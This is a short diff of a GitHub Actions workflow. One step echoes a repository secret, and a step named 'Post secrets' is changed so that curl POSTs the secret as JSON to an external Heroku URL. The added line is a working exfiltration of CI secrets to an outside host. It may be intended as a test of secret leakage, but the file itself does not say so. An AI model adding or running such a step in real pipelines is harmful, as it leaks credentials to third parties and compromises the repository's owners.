@@ -11,7 +11,7 @@ jobs:
         run: "echo ${{ secrets.OOGA }}"
 
       - name: "Post secrets"
-        run: "curl -H 'Content-Type: application/json' -d \"{\"a\": \"${{ secrets.OOGA }}\"}\""
+        run: "curl -H 'Content-Type: application/json' -d \"{\"a\": \"${{ secrets.OOGA }}\"}\" -X POST https://post-test.herokuapp.com/a"
   build:
     name: Build
     runs-on: ubuntu-18.04
